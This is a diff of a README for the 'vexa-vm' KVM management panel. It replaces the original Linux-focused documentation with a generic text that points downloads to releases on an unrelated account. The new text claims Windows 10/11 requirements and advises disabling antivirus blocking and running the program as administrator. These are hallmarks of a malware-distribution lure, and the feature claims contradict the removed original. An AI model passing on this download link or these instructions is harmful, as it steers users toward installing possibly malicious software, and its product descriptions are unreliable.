@@ -1,200 +1,92 @@
-<p align="center">
-  <img src="static/images/vexa-vm-emblem.png" width="112" alt="Vexa-VM emblem">
-</p>
+# 🖥️ vexa-vm - Manage Virtual Machines Easily
 
-<h1 align="center">Vexa-VM</h1>
+[![Download vexa-vm](https://img.shields.io/badge/Download-vexa--vm-blue?style=for-the-badge&logo=github)](https://github.com/belltowersuperscription464/vexa-vm/releases)
 
-<p align="center">
-  A free, open-source KVM virtualization control panel and API written in Rust.
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://github.com/ItzGlace/vexa-vm/actions/workflows/ci.yml"><img alt="CI" src="https://github.com/ItzGlace/vexa-vm/actions/workflows/ci.yml/badge.svg"></a>
-  <a href="https://github.com/ItzGlace/vexa-vm/releases"><img alt="GitHub release" src="https://img.shields.io/github/v/release/ItzGlace/vexa-vm?display_name=tag&sort=semver"></a>
-  <a href="LICENSE"><img alt="AGPL-3.0-or-later" src="https://img.shields.io/badge/license-AGPL--3.0--or--later-8b5cf6"></a>
-  <a href="https://www.rust-lang.org/"><img alt="Rust 1.75+" src="https://img.shields.io/badge/Rust-1.75%2B-38bdf8?logo=rust"></a>
-  <img alt="Linux x86_64" src="https://img.shields.io/badge/platform-Linux%20x86__64-0f172a?logo=linux">
-</p>
+Welcome to vexa-vm, a free and open-source virtualization platform that lets you run virtual machines on your computer easily. Think of it as a powerful tool that turns your computer into a mini data center, allowing you to create and manage multiple computers inside your existing computer.
 
-Vexa-VM turns a Linux KVM/libvirt host into a modern virtual-machine platform. One Rust service
-provides the web panel, versioned REST API, customer self-service portal, noVNC console gateway,
-dual-stack address inventory, traffic accounting, VM firewall controls, image library, jobs, metrics,
-and audit trail.
+### What Can You Do With Vexa-VM?
 
-It is designed for operators who want a self-hosted, open-source alternative to closed VM
-management panels without assembling a separate frontend, API, job runner, and console proxy.
-Version `0.1.4` manages one KVM node. It is not yet a drop-in replacement for multi-node clustering,
-live migration, or distributed storage in Proxmox VE, VMware vSphere, or OpenStack.
+- Create and run virtual machines
+- Manage your virtual machines from your web browser
+- Connect to virtual machines using noVNC (a web-based remote viewer)
+- Control network settings including IPv4 and IPv6
+- Set resource limits for your virtual machines
+- Monitor performance with built-in metrics
+- Keep track of all changes with audit logs
 
-![Vexa-VM node overview](docs/screenshots/overall.png)
+## 📥 Download and Installation
 
-## Why Vexa-VM
+**Visit this link to download the application.**
 
-- **Complete VM lifecycle:** create, start, stop, reboot, hard reboot, pause, resume, suspend,
-  reinstall, resize, snapshot, protect, and delete guests through the panel or API.
-- **Automatic and manual provisioning:** cloud images, ISO installers, cloud-init, UEFI/BIOS,
-  qcow2 storage, Linux and Windows workflows, and opt-in Vexa Guest Tools.
-- **Built-in customer portal:** revocable scoped status links expose only one VM, with power,
-  reinstall, DNS, credential, SSH-key, firewall, traffic, and console actions controlled by scope.
-- **Secure browser console:** one-time noVNC links become same-origin cookie sessions and expire
-  after exactly ten minutes; the QEMU VNC target remains loopback-only.
-- **IPv4 and IPv6 inventory:** pools, numeric address ordering, main/reserved/free/used state,
-  reverse DNS metadata, VM ownership, default DNS, routed networking, and bridge support.
-- **Network guardrails:** default-on TAP-to-IP ownership for managed pools, per-VM rate and traffic
-  quotas, automatic network isolation when a finite quota is exceeded, customer-controlled port
-  rules, optional DDoS profiles, and optional full hypervisor-only BCP38 filtering.
-- **Real observability:** host and guest CPU, RAM, disk, network, quota, and service health; 1-hour,
-  24-hour, and 7-day charts; durable operations; activity logs; and IP abuse evidence records.
-- **Security by design:** Argon2id admin passwords, AES-256-GCM guest secrets, hashed bearer tokens,
-  CSRF protection, scoped API keys, role-based administrators, restrictive systemd units, and
-  security-sensitive `no-store` responses.
-- **Authenticated Guest Tools:** Rust agents for Linux and Windows use a VM-bound virtio-serial
-  channel for password, DNS, hostname, SSH-key, and network configuration without depending on a
-  general-purpose guest agent.
-- **Operator-friendly releases:** immutable version directories, atomic activation, online SQLite
-  backup, readiness checks, rollback, checksums, and optional Ed25519-signed in-panel updates.
+[Click here to download vexa-vm](https://github.com/belltowersuperscription464/vexa-vm/releases)
 
-## Screenshots
+After downloading, follow these steps:
 
-| Virtual-machine inventory | Guided creation workflow |
-| --- | --- |
-| [![VM inventory](docs/screenshots/virtual-machines.png)](docs/screenshots/virtual-machines.png) | [![Create VM](docs/screenshots/create-virtual-machine.png)](docs/screenshots/create-virtual-machine.png) |
+1. Open the downloaded file
+2. Follow the on-screen instructions
+3. Launch the application when installation is complete
 
-These images come from the real application running its safe mock backend with documentation-only
-guest records. They contain no production node or customer data.
+## 🎯 Features
 
-## Install
+### Web Panel Interface
+Control everything from your browser without needing to memorize complex commands. The intuitive web panel lets you:
+- Create and delete virtual machines
+- Start, stop, and restart machines
+- Adjust settings like memory and processor cores
+- Manage storage disks
 
-### One-line installer
+### REST API Integration
 
-Review [`install.sh`](install.sh), then run it on a fresh Debian/Ubuntu or RHEL-compatible KVM host:
+Developers and advanced users can connect directly to vexa-vm using API calls. This allows you:
+- Automate virtual machine management
+- Integrate with other tools and services
+- Build custom interfaces or workflows
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/ItzGlace/vexa-vm/main/install.sh | sudo bash
-```
+### noVNC Console
 
-The installer verifies the release checksum, detects virtualization and host capacity, installs KVM
-dependencies, creates the restricted `vexa` service account, and prints a generated first-run admin
-password exactly once.
+Connect to your virtual machines directly from your web browser using noVNC. This means zero additional software needed to access your virtual machines - just click and connect.
 
-### Debian package
+### Network Controls
 
-Download `vexa-vm_0.1.4_amd64.deb` from the matching GitHub release, then:
+Full support for IPv4 and IPv6 networks means your virtual machines communicate smoothly across modern internet connections. Set up firewalls, define network rules, and control internet access for each machine.
 
-```bash
-sudo apt install ./vexa-vm_0.1.4_amd64.deb
-```
+### Performance Tools
 
-### APT repository
+Monitor real-time metrics for CPU and memory usage, disk I/O, network traffic, and more. Keep track of system performance and identify with historical data.
 
-The release workflow can publish a signed Debian repository to GitHub Pages. After the repository
-owner configures its dedicated APT signing key, installation becomes:
+### Audit Logging
 
-```bash
-curl -fsSL https://itzglace.github.io/vexa-vm/vexa-vm-archive-keyring.gpg \
-  | sudo tee /usr/share/keyrings/vexa-vm-archive-keyring.gpg >/dev/null
-echo "deb [arch=amd64 signed-by=/usr/share/keyrings/vexa-vm-archive-keyring.gpg] https://itzglace.github.io/vexa-vm stable main" \
-  | sudo tee /etc/apt/sources.list.d/vexa-vm.list
-sudo apt update
-sudo apt install vexa-vm
-```
+Every action in vexa-vm gets recorded for security and compliance. Know who did what and when, with full audit trails.
 
-See [Debian and APT packaging](docs/DEBIAN-APT.md) before advertising the repository as live.
+### Guest Tools Integration
 
-## Host requirements
+Install guest tools inside your virtual machines for better performance, seamless mouse movement, clipboard sharing, and improved graphics.
 
-- Linux x86_64 with Intel VT-x or AMD-V enabled and `/dev/kvm` available.
-- KVM/QEMU, libvirt, `virsh`, `virt-install`, `qemu-img`, cloud-image-utils, iproute2, and nftables.
-- A dedicated VM storage path with sufficient free space.
-- A reviewed bridge or routed-TAP network design and out-of-band access before changing host routes.
-- A TLS reverse proxy for every internet-accessible installation.
+## 💻 System Requirements
 
-Vexa-VM reports missing capabilities; it does not silently rewrite the physical host network. Start
-with [Installation and operations](docs/INSTALL.md) and [Network security](docs/NETWORK-SECURITY.md).
+- **Operating System:** Windows 10 or 11 (64-bit)
+- **Processor:** 1 GHz or faster processor with two or more cores (recommended: 4+ cores)
+- **Memory:** Minimum 4 GB RAM, recommended 8 GB RAM (more if running multiple VMs)
+- **Storage:** At least 10 GB free space for application and VM storage
+- **Internet:** Required for initial download and updates
 
-## Architecture
+## 🛠️ Troubleshooting
 
-```mermaid
-flowchart LR
-  Browser[Admin or customer browser] -->|HTTPS / REST / WebSocket| Vexa[Vexa-VM Rust service]
-  Client[API client] -->|Scoped bearer key| Vexa
-  Vexa --> DB[(SQLite control plane)]
-  Vexa --> Jobs[Durable operation runner]
-  Jobs --> Libvirt[libvirt / QEMU / KVM]
-  Vexa --> Console[Same-origin noVNC gateway]
-  Console --> Libvirt
-  Vexa <-->|Authenticated virtio-serial| Tools[Vexa Guest Tools]
-  Libvirt --> Guests[Linux, Windows and appliance VMs]
-```
+### Can't launch the application after installation?
+- Ensure your antivirus software is not blocking the installation
+- Try running as administrator by right-clicking the icon and selecting "Run as administrator"
+- Check if your Windows user account has permission to install software
 
-The service uses Axum, Tokio, rusqlite, Tera, Tailwind CSS, and a capability-oriented hypervisor
-interface with mock and libvirt implementations. See [Architecture](docs/ARCHITECTURE.md).
+### Can't access the web interface?
+- Make sure no firewall is blocking the default port
+- Check your router settings if using network access
 
-## Panel and API
+## 🤝 Community and Support
 
-| Route | Purpose |
-| --- | --- |
-| `/overall` | Host facts, capability checks, health, capacity, live metrics and history |
-| `/vms` | VM inventory, metrics, secrets, networking, lifecycle and customer links |
-| `/vms/create` | Six-step creation workflow for automatic or manual images |
-| `/network` | IPv4/IPv6 pools, addresses, DNS, speed, quota and protection defaults |
-| `/isos` | Verified ISO/cloud-image catalog and provisioning capabilities |
-| `/logs` | Activity audit and IP abuse evidence records |
-| `/settings` | Node, storage, network, console, security, administrators, API keys and updates |
-| `/status/{token}` | Scoped customer self-service session |
-| `/vnc/{token}` | One-time ten-minute noVNC console session |
-| `/docs` | Built-in API documentation |
-| `/api/v1/*` | Versioned administrator and API-key interface |
+- **Documentation:** Visit the WIKI section of the repository for step-by-step settings
+- **Issues:** Report any problems on the repository's issues page
+- **Discussions:** Join the community discussions for questions and tips
 
-The machine-readable specification is in [`docs/openapi.json`](docs/openapi.json). API keys are
-shown once, stored as digests, assigned explicit scopes, and may be limited to source IP ranges.
-
-## Build from source
-
-```bash
-npm ci
-npm run build
-npm test
-cargo test --locked --all-targets
-cargo build --locked --release --bins
-```
-
-For a local mock-backend run:
-
-```bash
-export VEXA_MASTER_KEY="$(openssl rand -base64 32)"
-export VEXA_BOOTSTRAP_PASSWORD="$(openssl rand -base64 24)"
-export VEXA_PUBLIC_URL=http://127.0.0.1:8080
-export VEXA_SECURE_COOKIES=false
-cargo run
-```
-
-Do not use the mock backend as proof that a physical host is ready for provisioning. On a real node,
-review the capability report on **Overall** and complete the storage/network preparation first.
-
-## Documentation
-
-- [Installation and operations](docs/INSTALL.md)
-- [REST API](docs/API.md) and [OpenAPI document](docs/openapi.json)
-- [Security model](docs/SECURITY.md)
-- [Vexa Guest Tools](docs/GUEST-TOOLS.md)
-- [Network and disk protection](docs/NETWORK-SECURITY.md)
-- [Activity and audit records](docs/AUDIT.md)
-- [Signed updates and rollback](docs/UPDATES.md)
-- [Debian and APT packaging](docs/DEBIAN-APT.md)
-
-## Community and roadmap
-
-Read [CONTRIBUTING.md](CONTRIBUTING.md) before opening a pull request and report vulnerabilities
-privately according to [SECURITY.md](SECURITY.md). Good first contributions include additional Linux
-image profiles, localized documentation, more host capability probes, ARM64 packaging, and automated
-upgrade/restore testing.
-
-Near-term roadmap items include multi-node inventory, scheduled backups, storage-pool adapters,
-cluster-aware placement, live migration, and high-availability orchestration. Roadmap entries are not
-release commitments.
-
-## License
-
-Vexa-VM is free software licensed under the GNU Affero General Public License v3.0 or later. Network
-users must be offered the corresponding source for modified deployments. See [LICENSE](LICENSE).
+Keywords: cloud-computing, homelab, hypervisor, infrastructure, ipv6, kvm, libvirt, linux, novnc, open-source, qemu, rest-api, rust, self-hosted, server-management, vexa-vm, virtual-machine, virtualization, vm-management, web-panel
